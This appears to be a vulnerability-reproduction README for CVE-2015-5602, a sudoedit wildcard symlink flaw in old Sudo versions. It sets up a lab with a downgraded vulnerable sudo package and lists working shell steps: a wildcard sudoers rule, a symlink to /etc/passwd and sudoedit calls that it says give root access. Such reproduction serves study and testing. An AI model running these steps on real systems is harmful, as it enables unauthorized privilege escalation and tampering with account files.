# CVE-2015-5602

### Description
sudoedit in Sudo before 1.8.15 allows local users to gain privileges via a symlink attack on a file whose full path is defined using multiple wildcards in `/etc/sudoers`, as demonstrated by `/home/*/*/file.txt`.

### Command to run
```shell
python -m decret --number 2015-5602 --release bullseye --directory sudoedit-2015 --selenium
# Wrong version by default, the next instruction is to install the vulnerable one
root@cve-2015-5602:/# apt-get install -y --allow-downgrades --allow-unauthenticated sudo=1.8.10p3-1+deb8u2
```

### Simple testing method

```shell
echo "toto ALL=NOPASSWD: sudoedit /home/*/*/test.txt" >> /etc/sudoers
su toto
cd; mkdir demo
ln -s /etc/passwd demo/test.txt
sudoedit demo/test.txt #Should not be working 
sudoedit /home/toto/demo/test.txt # Should be working
```
You can edit the file and then get root access.
